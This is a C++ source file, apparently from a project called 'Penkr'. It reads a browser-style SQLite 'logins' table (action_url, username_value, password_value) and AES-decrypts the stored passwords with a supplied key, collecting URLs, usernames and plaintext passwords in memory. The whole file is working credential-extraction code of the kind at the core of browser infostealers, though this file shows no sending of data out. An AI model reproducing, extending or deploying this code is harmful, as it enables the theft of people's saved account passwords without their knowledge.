#include "pch.hpp"
#include "db.hpp"
#include "aesdecrypt.hpp"

#include "SQLiteCpp/SQLiteCpp.h"

namespace Penkr
{
	// Loads the database file and decrypts its data using a key
	PenkrDB::PenkrDB(const std::filesystem::path& filepath, const std::string& key)
		: m_Values(nullptr), m_Size(0)
	{
		// Load the database itself using SQLite
		SQLite::Database db(filepath.string());

		// Create a vector for the resulting data
		std::vector<PenkrValue> data;

		try
		{
			// Create a query for each row in the logins table
			SQLite::Statement query(db, "SELECT action_url, username_value, password_value FROM logins");

			// For each row in the database...
			while (query.executeStep())
			{
				// .. pick the URL, Username and Cipher.
				const char* url = query.getColumn(0);
				const char* username = query.getColumn(1);
				const char* cipher = query.getColumn(2);

				// Then decrypt the cipher into a password using AES, supplying the key.
				std::string password = AES::DecryptAES(cipher, key);

				// Then save the resulting URL, Username and Password
				// in the vector.
				data.emplace_back(url, username, password);
			}
		}
		catch (std::exception& e)
		{
			std::cout << "SQL Error: " << e.what() << "\n";
		}

		// Lastly create an array for the data locally
		m_Size = data.size();
		m_Values = new PenkrValue[m_Size];
		PenkrValue* ptr = m_Values;
		for (const auto& value : data)
		{
			*ptr = value;
			++ptr;
		}
	}

	PenkrDB::~PenkrDB()
	{
		// Free the local array when the database data isn't needed anymore
		if (m_Values)
		{
			delete[] m_Values;
			m_Values = nullptr;
			m_Size = 0;
		}
	}
}